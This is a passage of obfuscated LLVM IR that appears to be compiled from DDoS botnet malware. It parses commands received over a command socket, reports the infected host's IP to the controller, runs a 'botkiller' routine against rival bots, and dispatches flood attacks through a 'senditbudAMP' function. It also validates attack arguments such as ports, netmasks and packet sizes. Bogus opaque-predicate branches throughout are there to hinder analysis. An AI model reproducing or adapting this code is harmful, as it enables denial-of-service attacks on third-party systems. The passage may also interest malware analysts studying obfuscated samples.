  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.525, i32 0, i32 0)) #10
  %292 = icmp ne i32 %291, 0
  br i1 %292, label %334, label %293

; <label>:293:                                    ; preds = %287
  %294 = load i32, i32* @x.103
  %295 = load i32, i32* @y.104
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %293
  %302 = call i32 @listFork()
  %303 = icmp ne i32 %302, 0
  %304 = load i32, i32* @x.103
  %305 = load i32, i32* @y.104
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %303, label %317, label %312

; <label>:312:                                    ; preds = %originalBBpart240
  %313 = load i32, i32* @mainCommSock, align 4
  %314 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %315 = call i8* @inet_ntoa(i32 %314) #2
  %316 = call i32 (i32, i8*, ...) @sockprintf(i32 %313, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.526, i32 0, i32 0), i8* %315)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:317:                                    ; preds = %originalBBpart240
  %318 = load i32, i32* @x.103
  %319 = load i32, i32* @y.104
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %317
  %326 = load i32, i32* @x.103
  %327 = load i32, i32* @y.104
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %334

; <label>:334:                                    ; preds = %originalBBpart244, %287
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 0
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @strcmp(i8* %337, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.527, i32 0, i32 0)) #10
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %341, label %340

; <label>:340:                                    ; preds = %334
  br label %1829

; <label>:341:                                    ; preds = %334
  %342 = load i8**, i8*** %4, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i64 0
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @strcmp(i8* %344, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.528, i32 0, i32 0)) #10
  %346 = icmp ne i32 %345, 0
  br i1 %346, label %700, label %347

; <label>:347:                                    ; preds = %341
  %348 = load i32, i32* @x.103
  %349 = load i32, i32* @y.104
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %347
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 1
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @strcmp(i8* %358, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %360 = icmp ne i32 %359, 0
  %361 = load i32, i32* @x.103
  %362 = load i32, i32* @y.104
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %360, label %395, label %369

; <label>:369:                                    ; preds = %originalBBpart248
  %370 = load i32, i32* %3, align 4
  %371 = icmp ne i32 %370, 5
  br i1 %371, label %372, label %373

; <label>:372:                                    ; preds = %369
  br label %1829

; <label>:373:                                    ; preds = %369
  %374 = load i8**, i8*** %4, align 8
  %375 = getelementptr inbounds i8*, i8** %374, i64 2
  %376 = load i8*, i8** %375, align 8
  %377 = ptrtoint i8* %376 to i32
  store i32 %377, i32* %8, align 4
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 3
  %380 = load i8*, i8** %379, align 8
  %381 = ptrtoint i8* %380 to i32
  store i32 %381, i32* %9, align 4
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 4
  %384 = load i8*, i8** %383, align 8
  %385 = ptrtoint i8* %384 to i32
  store i32 %385, i32* %10, align 4
  %386 = load i32, i32* %8, align 4
  %387 = sext i32 %386 to i64
  %388 = inttoptr i64 %387 to i8*
  %389 = load i32, i32* %9, align 4
  %390 = sext i32 %389 to i64
  %391 = inttoptr i64 %390 to i8*
  %392 = load i32, i32* %10, align 4
  %393 = sext i32 %392 to i64
  %394 = inttoptr i64 %393 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0), i8* %388, i8* %391, i8* %394)
  br label %395

; <label>:395:                                    ; preds = %373, %originalBBpart248
  %396 = load i32, i32* @x.103
  %397 = load i32, i32* @y.104
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %395
  %404 = load i8**, i8*** %4, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 1
  %406 = load i8*, i8** %405, align 8
  %407 = call i32 @strcmp(i8* %406, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %408 = icmp ne i32 %407, 0
  %409 = load i32, i32* @x.103
  %410 = load i32, i32* @y.104
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %408, label %443, label %417

; <label>:417:                                    ; preds = %originalBBpart252
  %418 = load i32, i32* %3, align 4
  %419 = icmp ne i32 %418, 5
  br i1 %419, label %420, label %421

; <label>:420:                                    ; preds = %417
  br label %1829

; <label>:421:                                    ; preds = %417
  %422 = load i8**, i8*** %4, align 8
  %423 = getelementptr inbounds i8*, i8** %422, i64 2
  %424 = load i8*, i8** %423, align 8
  %425 = ptrtoint i8* %424 to i32
  store i32 %425, i32* %11, align 4
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 3
  %428 = load i8*, i8** %427, align 8
  %429 = ptrtoint i8* %428 to i32
  store i32 %429, i32* %12, align 4
  %430 = load i8**, i8*** %4, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 4
  %432 = load i8*, i8** %431, align 8
  %433 = ptrtoint i8* %432 to i32
  store i32 %433, i32* %13, align 4
  %434 = load i32, i32* %11, align 4
  %435 = sext i32 %434 to i64
  %436 = inttoptr i64 %435 to i8*
  %437 = load i32, i32* %12, align 4
  %438 = sext i32 %437 to i64
  %439 = inttoptr i64 %438 to i8*
  %440 = load i32, i32* %13, align 4
  %441 = sext i32 %440 to i64
  %442 = inttoptr i64 %441 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0), i8* %436, i8* %439, i8* %442)
  br label %443

; <label>:443:                                    ; preds = %421, %originalBBpart252
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 1
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @strcmp(i8* %446, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0)) #10
  %448 = icmp ne i32 %447, 0
  br i1 %448, label %475, label %449

; <label>:449:                                    ; preds = %443
  %450 = load i32, i32* %3, align 4
  %451 = icmp ne i32 %450, 5
  br i1 %451, label %452, label %453

; <label>:452:                                    ; preds = %449
  br label %1829

; <label>:453:                                    ; preds = %449
  %454 = load i8**, i8*** %4, align 8
  %455 = getelementptr inbounds i8*, i8** %454, i64 2
  %456 = load i8*, i8** %455, align 8
  %457 = ptrtoint i8* %456 to i32
  store i32 %457, i32* %14, align 4
  %458 = load i8**, i8*** %4, align 8
  %459 = getelementptr inbounds i8*, i8** %458, i64 3
  %460 = load i8*, i8** %459, align 8
  %461 = ptrtoint i8* %460 to i32
  store i32 %461, i32* %15, align 4
  %462 = load i8**, i8*** %4, align 8
  %463 = getelementptr inbounds i8*, i8** %462, i64 4
  %464 = load i8*, i8** %463, align 8
  %465 = ptrtoint i8* %464 to i32
  store i32 %465, i32* %16, align 4
  %466 = load i32, i32* %14, align 4
  %467 = sext i32 %466 to i64
  %468 = inttoptr i64 %467 to i8*
  %469 = load i32, i32* %15, align 4
  %470 = sext i32 %469 to i64
  %471 = inttoptr i64 %470 to i8*
  %472 = load i32, i32* %16, align 4
  %473 = sext i32 %472 to i64
  %474 = inttoptr i64 %473 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0), i8* %468, i8* %471, i8* %474)
  br label %475

; <label>:475:                                    ; preds = %453, %443
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 1
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 @strcmp(i8* %478, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #10
  %480 = icmp ne i32 %479, 0
  br i1 %480, label %523, label %481

; <label>:481:                                    ; preds = %475
  %482 = load i32, i32* @x.103
  %483 = load i32, i32* @y.104
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %481
  %490 = load i32, i32* %3, align 4
  %491 = icmp ne i32 %490, 5
  %492 = load i32, i32* @x.103
  %493 = load i32, i32* @y.104
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %491, label %500, label %501

; <label>:500:                                    ; preds = %originalBBpart256
  br label %1829

; <label>:501:                                    ; preds = %originalBBpart256
  %502 = load i8**, i8*** %4, align 8
  %503 = getelementptr inbounds i8*, i8** %502, i64 2
  %504 = load i8*, i8** %503, align 8
  %505 = ptrtoint i8* %504 to i32
  store i32 %505, i32* %17, align 4
  %506 = load i8**, i8*** %4, align 8
  %507 = getelementptr inbounds i8*, i8** %506, i64 3
  %508 = load i8*, i8** %507, align 8
  %509 = ptrtoint i8* %508 to i32
  store i32 %509, i32* %18, align 4
  %510 = load i8**, i8*** %4, align 8
  %511 = getelementptr inbounds i8*, i8** %510, i64 4
  %512 = load i8*, i8** %511, align 8
  %513 = ptrtoint i8* %512 to i32
  store i32 %513, i32* %19, align 4
  %514 = load i32, i32* %17, align 4
  %515 = sext i32 %514 to i64
  %516 = inttoptr i64 %515 to i8*
  %517 = load i32, i32* %18, align 4
  %518 = sext i32 %517 to i64
  %519 = inttoptr i64 %518 to i8*
  %520 = load i32, i32* %19, align 4
  %521 = sext i32 %520 to i64
  %522 = inttoptr i64 %521 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0), i8* %516, i8* %519, i8* %522)
  br label %523

; <label>:523:                                    ; preds = %501, %475
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 1
  %526 = load i8*, i8** %525, align 8
  %527 = call i32 @strcmp(i8* %526, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0)) #10
  %528 = icmp ne i32 %527, 0
  br i1 %528, label %571, label %529

; <label>:529:                                    ; preds = %523
  %530 = load i32, i32* @x.103
  %531 = load i32, i32* @y.104
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %529
  %538 = load i32, i32* %3, align 4
  %539 = icmp ne i32 %538, 5
  %540 = load i32, i32* @x.103
  %541 = load i32, i32* @y.104
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %539, label %548, label %549

; <label>:548:                                    ; preds = %originalBBpart260
  br label %1829

; <label>:549:                                    ; preds = %originalBBpart260
  %550 = load i8**, i8*** %4, align 8
  %551 = getelementptr inbounds i8*, i8** %550, i64 2
  %552 = load i8*, i8** %551, align 8
  %553 = ptrtoint i8* %552 to i32
  store i32 %553, i32* %20, align 4
  %554 = load i8**, i8*** %4, align 8
  %555 = getelementptr inbounds i8*, i8** %554, i64 3
  %556 = load i8*, i8** %555, align 8
  %557 = ptrtoint i8* %556 to i32
  store i32 %557, i32* %21, align 4
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 4
  %560 = load i8*, i8** %559, align 8
  %561 = ptrtoint i8* %560 to i32
  store i32 %561, i32* %22, align 4
  %562 = load i32, i32* %20, align 4
  %563 = sext i32 %562 to i64
  %564 = inttoptr i64 %563 to i8*
  %565 = load i32, i32* %21, align 4
  %566 = sext i32 %565 to i64
  %567 = inttoptr i64 %566 to i8*
  %568 = load i32, i32* %22, align 4
  %569 = sext i32 %568 to i64
  %570 = inttoptr i64 %569 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0), i8* %564, i8* %567, i8* %570)
  br label %571

; <label>:571:                                    ; preds = %549, %523
  %572 = load i32, i32* @x.103
  %573 = load i32, i32* @y.104
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %571
  %580 = load i8**, i8*** %4, align 8
  %581 = getelementptr inbounds i8*, i8** %580, i64 1
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @strcmp(i8* %582, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %584 = icmp ne i32 %583, 0
  %585 = load i32, i32* @x.103
  %586 = load i32, i32* @y.104
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %584, label %635, label %593

; <label>:593:                                    ; preds = %originalBBpart264
  %594 = load i32, i32* @x.103
  %595 = load i32, i32* @y.104
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %593
  %602 = load i32, i32* %3, align 4
  %603 = icmp ne i32 %602, 5
  %604 = load i32, i32* @x.103
  %605 = load i32, i32* @y.104
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %603, label %612, label %613

; <label>:612:                                    ; preds = %originalBBpart268
  br label %1829

; <label>:613:                                    ; preds = %originalBBpart268
  %614 = load i8**, i8*** %4, align 8
  %615 = getelementptr inbounds i8*, i8** %614, i64 2
  %616 = load i8*, i8** %615, align 8
  %617 = ptrtoint i8* %616 to i32
  store i32 %617, i32* %23, align 4
  %618 = load i8**, i8*** %4, align 8
  %619 = getelementptr inbounds i8*, i8** %618, i64 3
  %620 = load i8*, i8** %619, align 8
  %621 = ptrtoint i8* %620 to i32
  store i32 %621, i32* %24, align 4
  %622 = load i8**, i8*** %4, align 8
  %623 = getelementptr inbounds i8*, i8** %622, i64 4
  %624 = load i8*, i8** %623, align 8
  %625 = ptrtoint i8* %624 to i32
  store i32 %625, i32* %25, align 4
  %626 = load i32, i32* %23, align 4
  %627 = sext i32 %626 to i64
  %628 = inttoptr i64 %627 to i8*
  %629 = load i32, i32* %24, align 4
  %630 = sext i32 %629 to i64
  %631 = inttoptr i64 %630 to i8*
  %632 = load i32, i32* %25, align 4
  %633 = sext i32 %632 to i64
  %634 = inttoptr i64 %633 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0), i8* %628, i8* %631, i8* %634)
  br label %635

; <label>:635:                                    ; preds = %613, %originalBBpart264
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 1
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 @strcmp(i8* %638, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %640 = icmp ne i32 %639, 0
  br i1 %640, label %699, label %641

; <label>:641:                                    ; preds = %635
  %642 = load i32, i32* @x.103
  %643 = load i32, i32* @y.104
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %641
  %650 = load i32, i32* %3, align 4
  %651 = icmp ne i32 %650, 5
  %652 = load i32, i32* @x.103
  %653 = load i32, i32* @y.104
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %651, label %660, label %677

; <label>:660:                                    ; preds = %originalBBpart272
  %661 = load i32, i32* @x.103
  %662 = load i32, i32* @y.104
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %660
  %669 = load i32, i32* @x.103
  %670 = load i32, i32* @y.104
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %1829

; <label>:677:                                    ; preds = %originalBBpart272
  %678 = load i8**, i8*** %4, align 8
  %679 = getelementptr inbounds i8*, i8** %678, i64 2
  %680 = load i8*, i8** %679, align 8
  %681 = ptrtoint i8* %680 to i32
  store i32 %681, i32* %26, align 4
  %682 = load i8**, i8*** %4, align 8
  %683 = getelementptr inbounds i8*, i8** %682, i64 3
  %684 = load i8*, i8** %683, align 8
  %685 = ptrtoint i8* %684 to i32
  store i32 %685, i32* %27, align 4
  %686 = load i8**, i8*** %4, align 8
  %687 = getelementptr inbounds i8*, i8** %686, i64 4
  %688 = load i8*, i8** %687, align 8
  %689 = ptrtoint i8* %688 to i32
  store i32 %689, i32* %28, align 4
  %690 = load i32, i32* %26, align 4
  %691 = sext i32 %690 to i64
  %692 = inttoptr i64 %691 to i8*
  %693 = load i32, i32* %27, align 4
  %694 = sext i32 %693 to i64
  %695 = inttoptr i64 %694 to i8*
  %696 = load i32, i32* %28, align 4
  %697 = sext i32 %696 to i64
  %698 = inttoptr i64 %697 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0), i8* %692, i8* %695, i8* %698)
  br label %699

; <label>:699:                                    ; preds = %677, %635
  br label %700

; <label>:700:                                    ; preds = %699, %341
  %701 = load i32, i32* @x.103
  %702 = load i32, i32* @y.104
  %703 = sub i32 %701, 1
  %704 = mul i32 %701, %703
  %705 = urem i32 %704, 2
  %706 = icmp eq i32 %705, 0
  %707 = icmp slt i32 %702, 10
  %708 = or i1 %706, %707
  br i1 %708, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %700
  %709 = load i8**, i8*** %4, align 8
  %710 = getelementptr inbounds i8*, i8** %709, i64 0
  %711 = load i8*, i8** %710, align 8
  %712 = call i32 @strcmp(i8* %711, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.529, i32 0, i32 0)) #10
  %713 = icmp ne i32 %712, 0
  %714 = load i32, i32* @x.103
  %715 = load i32, i32* @y.104
  %716 = sub i32 %714, 1
  %717 = mul i32 %714, %716
  %718 = urem i32 %717, 2
  %719 = icmp eq i32 %718, 0
  %720 = icmp slt i32 %715, 10
  %721 = or i1 %719, %720
  br i1 %721, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %713, label %977, label %722

; <label>:722:                                    ; preds = %originalBBpart280
  %723 = load i32, i32* %3, align 4
  %724 = icmp slt i32 %723, 6
  br i1 %724, label %824, label %725

; <label>:725:                                    ; preds = %722
  %726 = load i8**, i8*** %4, align 8
  %727 = getelementptr inbounds i8*, i8** %726, i64 3
  %728 = load i8*, i8** %727, align 8
  %729 = call i32 @atoi(i8* %728) #10
  %730 = icmp eq i32 %729, -1
  br i1 %730, label %824, label %731

; <label>:731:                                    ; preds = %725
  %732 = load i8**, i8*** %4, align 8
  %733 = getelementptr inbounds i8*, i8** %732, i64 2
  %734 = load i8*, i8** %733, align 8
  %735 = call i32 @atoi(i8* %734) #10
  %736 = icmp eq i32 %735, -1
  br i1 %736, label %824, label %737

; <label>:737:                                    ; preds = %731
  %738 = load i8**, i8*** %4, align 8
  %739 = getelementptr inbounds i8*, i8** %738, i64 4
  %740 = load i8*, i8** %739, align 8
  %741 = call i32 @atoi(i8* %740) #10
  %742 = icmp eq i32 %741, -1
  br i1 %742, label %824, label %743

; <label>:743:                                    ; preds = %737
  %744 = load i32, i32* @x.103
  %745 = load i32, i32* @y.104
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %743
  %752 = load i8**, i8*** %4, align 8
  %753 = getelementptr inbounds i8*, i8** %752, i64 5
  %754 = load i8*, i8** %753, align 8
  %755 = call i32 @atoi(i8* %754) #10
  %756 = icmp eq i32 %755, -1
  %757 = load i32, i32* @x.103
  %758 = load i32, i32* @y.104
  %759 = sub i32 %757, 1
  %760 = mul i32 %757, %759
  %761 = urem i32 %760, 2
  %762 = icmp eq i32 %761, 0
  %763 = icmp slt i32 %758, 10
  %764 = or i1 %762, %763
  br i1 %764, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %756, label %824, label %765

; <label>:765:                                    ; preds = %originalBBpart284
  %766 = load i8**, i8*** %4, align 8
  %767 = getelementptr inbounds i8*, i8** %766, i64 5
  %768 = load i8*, i8** %767, align 8
  %769 = call i32 @atoi(i8* %768) #10
  %770 = icmp sgt i32 %769, 65536
  br i1 %770, label %824, label %771

; <label>:771:                                    ; preds = %765
  %772 = load i32, i32* @x.103
  %773 = load i32, i32* @y.104
  %774 = sub i32 %772, 1
  %775 = mul i32 %772, %774
  %776 = urem i32 %775, 2
  %777 = icmp eq i32 %776, 0
  %778 = icmp slt i32 %773, 10
  %779 = or i1 %777, %778
  br i1 %779, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %771
  %780 = load i8**, i8*** %4, align 8
  %781 = getelementptr inbounds i8*, i8** %780, i64 5
  %782 = load i8*, i8** %781, align 8
  %783 = call i32 @atoi(i8* %782) #10
  %784 = icmp sgt i32 %783, 65500
  %785 = load i32, i32* @x.103
  %786 = load i32, i32* @y.104
  %787 = sub i32 %785, 1
  %788 = mul i32 %785, %787
  %789 = urem i32 %788, 2
  %790 = icmp eq i32 %789, 0
  %791 = icmp slt i32 %786, 10
  %792 = or i1 %790, %791
  br i1 %792, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %784, label %824, label %793

; <label>:793:                                    ; preds = %originalBBpart288
  %794 = load i32, i32* @x.103
  %795 = load i32, i32* @y.104
  %796 = sub i32 %794, 1
  %797 = mul i32 %794, %796
  %798 = urem i32 %797, 2
  %799 = icmp eq i32 %798, 0
  %800 = icmp slt i32 %795, 10
  %801 = or i1 %799, %800
  br i1 %801, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %793
  %802 = load i8**, i8*** %4, align 8
  %803 = getelementptr inbounds i8*, i8** %802, i64 4
  %804 = load i8*, i8** %803, align 8
  %805 = call i32 @atoi(i8* %804) #10
  %806 = icmp sgt i32 %805, 32
  %807 = load i32, i32* @x.103
  %808 = load i32, i32* @y.104
  %809 = sub i32 %807, 1
  %810 = mul i32 %807, %809
  %811 = urem i32 %810, 2
  %812 = icmp eq i32 %811, 0
  %813 = icmp slt i32 %808, 10
  %814 = or i1 %812, %813
  br i1 %814, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %806, label %824, label %815

; <label>:815:                                    ; preds = %originalBBpart292
  %816 = load i32, i32* %3, align 4
  %817 = icmp eq i32 %816, 7
  br i1 %817, label %818, label %825

; <label>:818:                                    ; preds = %815
  %819 = load i8**, i8*** %4, align 8
  %820 = getelementptr inbounds i8*, i8** %819, i64 6
  %821 = load i8*, i8** %820, align 8
  %822 = call i32 @atoi(i8* %821) #10
  %823 = icmp slt i32 %822, 1
  br i1 %823, label %824, label %825

; <label>:824:                                    ; preds = %818, %originalBBpart292, %originalBBpart288, %765, %originalBBpart284, %737, %731, %725, %722
  br label %1829

; <label>:825:                                    ; preds = %818, %815
  %826 = load i8**, i8*** %4, align 8
  %827 = getelementptr inbounds i8*, i8** %826, i64 1
  %828 = load i8*, i8** %827, align 8
  store i8* %828, i8** %29, align 8
  %829 = load i8**, i8*** %4, align 8
  %830 = getelementptr inbounds i8*, i8** %829, i64 2
  %831 = load i8*, i8** %830, align 8
  %832 = call i32 @atoi(i8* %831) #10
  store i32 %832, i32* %30, align 4
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 3
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @atoi(i8* %835) #10
  store i32 %836, i32* %31, align 4
  %837 = load i8**, i8*** %4, align 8
  %838 = getelementptr inbounds i8*, i8** %837, i64 4
  %839 = load i8*, i8** %838, align 8
  %840 = call i32 @atoi(i8* %839) #10
  store i32 %840, i32* %32, align 4
  %841 = load i8**, i8*** %4, align 8
  %842 = getelementptr inbounds i8*, i8** %841, i64 5
  %843 = load i8*, i8** %842, align 8
  %844 = call i32 @atoi(i8* %843) #10
  store i32 %844, i32* %33, align 4
  %845 = load i32, i32* %3, align 4
  %846 = icmp sgt i32 %845, 6
  br i1 %846, label %847, label %852

; <label>:847:                                    ; preds = %825
  %848 = load i8**, i8*** %4, align 8
  %849 = getelementptr inbounds i8*, i8** %848, i64 6
  %850 = load i8*, i8** %849, align 8
  %851 = call i32 @atoi(i8* %850) #10
  br label %853

; <label>:852:                                    ; preds = %825
  br label %853

; <label>:853:                                    ; preds = %852, %847
  %854 = phi i32 [ %851, %847 ], [ 1000, %852 ]
  store i32 %854, i32* %34, align 4
  %855 = load i32, i32* %3, align 4
